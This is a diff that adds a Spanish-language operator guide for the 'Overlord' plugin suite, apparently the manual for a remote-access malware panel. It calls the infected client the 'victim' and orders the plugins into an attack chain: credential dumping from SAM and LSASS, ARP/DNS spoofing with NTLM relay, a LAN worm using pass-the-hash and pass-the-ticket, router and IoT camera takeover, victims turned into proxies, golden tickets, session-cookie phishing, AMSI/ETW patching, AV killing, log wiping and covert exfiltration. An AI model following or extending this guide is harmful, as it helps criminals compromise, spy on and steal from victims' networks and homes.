@@ -1,0 +1,157 @@
+═══════════════════════════════════════════════════════════════════
+  OVERLORD PLUGIN SUITE — ORDEN DE USO
+═══════════════════════════════════════════════════════════════════
+
+Cada plugin es independiente. Se compila en tu PC y se sube al panel.
+El .dll va al cliente (víctima). El server.js corre en el VPS.
+
+───────────────────────────────────────────────────────────────────
+  BUILD (en tu PC)
+───────────────────────────────────────────────────────────────────
+
+  Opción A — todos de una:
+    cd "C:\...\plug"
+    build-all.bat
+
+  Opción B — uno solo:
+    cd "C:\...\plug\<plugin>"
+    build.bat
+
+Produce <plugin>.zip con: el .dll, html/css/js, config.json, server.js.
+
+Si falla con "missing go.sum entry":
+  go mod tidy
+  .\build.bat
+
+  (solo whisper lo necesita — usa golang.org/x/sys para DPAPI)
+
+Subir: Panel → Plugins → Upload → elegir el .zip
+Habilitar: click en enable → confirmar el aviso de plugin no confiable.
+           Ese click es el que arranca el worker del servidor.
+
+───────────────────────────────────────────────────────────────────
+  EVASION COMPARTIDA (todos los plugins)
+───────────────────────────────────────────────────────────────────
+
+Todos los plugins aplican un pre-flight al recibir su primer evento:
+
+  · ETW patching   — EtwEventWrite* devuelve éxito sin escribir el evento
+  · AMSI patching  — AmsiScanBuffer devuelve éxito sin escanear
+
+Ambos son en memoria, solo afectan al proceso, no tocan disco ni otros
+procesos. Es silencioso. El plugin te reporta "evasion" con el resultado.
+
+Lo ruidoso (matar AV, desactivar Defender) está SOLO en el plugin
+`evasion`, en una tarjeta roja con confirmación.
+
+───────────────────────────────────────────────────────────────────
+  ORDEN LÓGICO DE USO
+───────────────────────────────────────────────────────────────────
+
+FASE 1 — RECONOCIMIENTO (no toca nada, solo lee)
+────────────────────────────────────────────────
+  1. lanmap     Escanea la red del cliente. ARP + puertos.
+                Te dice qué dispositivos hay y qué son.
+                NO necesita admin. Empezá por acá.
+
+  2. admap      Si el cliente está en un dominio, enumera AD:
+                usuarios, grupos, computadoras, findings.
+                Detecta cuentas AS-REP y kerberoastables.
+
+FASE 2 — CREDENCIALES
+────────────────────────────────────────────────
+  3. mimik      Dumpea SAM/SYSTEM/SECURITY y LSASS del host.
+                REQUIERE ADMIN. Sin esto no hay creds.
+                Verificá con "check priv" antes de intentar.
+
+  4. mitm       ARP spoof + DNS hijack + captura NTLM (LLMNS/NBT-NS)
+                + SMB relay. Ataca a los OTROS dispositivos de la red.
+                REQUIERE ADMIN (sockets raw).
+                Los hashes capturados acá SÍ sirven para relay.
+
+FASE 3 — PROPAGACIÓN
+────────────────────────────────────────────────
+  5. worm       Se propaga por la LAN usando las creds de mimik.
+                Motor SMB2 nativo — acepta los TRES tipos de credencial:
+
+                  password123          → NTLMv2 calculado desde el password
+                  hash:8846f7eaee...   → pass-the-hash, sin password
+                  ticket:<base64>      → pass-the-ticket (Kerberos AP-REQ)
+
+                Esto es lo importante: la API de Windows (`net use`) NO
+                acepta un hash. Por eso el worm habla NTLM a mano.
+
+                NECESITA: payload (.exe del agente) + al menos una cred.
+                Guarda un marcador en el registro para no reinfectar.
+                Métodos: psexec (RPC sobre IPC$), schtasks, wmi.
+
+FASE 4 — INFRAESTRUCTURA
+────────────────────────────────────────────────
+  6. router     Toma el router: creds por defecto, cambio de DNS,
+                UPnP, dump de la tabla DHCP.
+                Con el DNS del router controlás TODA la casa.
+
+  7. iot        Cámaras IP, smart TVs, hubs. Snapshots y control.
+                Usa los puertos que encontró lanmap.
+
+  8. respool    Cada víctima se vuelve un proxy residencial.
+                Gateway en el VPS + nodo en el cliente.
+                HTTP CONNECT y SOCKS5.
+
+FASE 5 — DOMINIO
+────────────────────────────────────────────────
+  9. dcsync     Recon de DRSUAPI, forja golden tickets,
+                construye AS-REQ. Necesita admin de dominio.
+
+FASE 6 — PHISHING
+────────────────────────────────────────────────
+ 10. aitm       Relay reverso que roba la cookie de sesión en vivo.
+                Genera dominios parecidos. Portal cautivo. OAuth.
+
+FASE 7 — COBERTURA Y EXTRACCIÓN
+────────────────────────────────────────────────
+ 11. evasion   Parchea AMSI/ETW, desengancha ntdll, borra logs,
+                timestomp. Va ANTES de los plugins ruidosos.
+
+ 12. privsec   Potato attacks, bypass de UAC, robo de tokens.
+                De usuario a SYSTEM.
+
+ 13. exfil     Canales encubiertos: ICMP, DNS tunneling, HTTPS.
+
+───────────────────────────────────────────────────────────────────
+  CADENA COMPLETA (de un solo implante)
+───────────────────────────────────────────────────────────────────
+
+  lanmap → mimik → worm → (hosts nuevos entran solos)
+                              ↓
+                          kematian auto-colecta
+                              ↓
+  router → mitm → DNS hijack → aitm → cookies de sesión
+                              ↓
+                     admap → dcsync → golden ticket
+
+───────────────────────────────────────────────────────────────────
+  WHISPER (Discord) — aparte, no depende de nada
+───────────────────────────────────────────────────────────────────
+
+  Modo VPS:    no necesita cliente. Pegás un token y listo.
+  Modo cliente: necesita client id.
+
+  OJO: token con code 40002 = cuenta sin verificar. Discord la bloquea.
+       Ningún código arregla eso, la cuenta tiene que verificarse.
+
+───────────────────────────────────────────────────────────────────
+  NOTAS CRÍTICAS
+───────────────────────────────────────────────────────────────────
+
+  · mimik, mitm, worm, router, evasion NECESITAN ADMIN en el cliente.
+  · lanmap, admap, iot, dcsync, respool NO necesitan admin.
+  · worm acepta password, hash y ticket. Para WMI solo password
+    (Windows no tiene API pública para abrir un logon desde un hash);
+    psexec y schtasks sí funcionan con hash vía SMB2.
+  · evasion es lo más ruidoso si usás kill_av o disable_defender.
+    Los parches de AMSI/ETW son silenciosos; matar procesos no.
+  · factory_reset del plugin router está desactivado a propósito:
+    borraría la config que acabás de secuestrar.
+
+═══════════════════════════════════════════════════════════════════
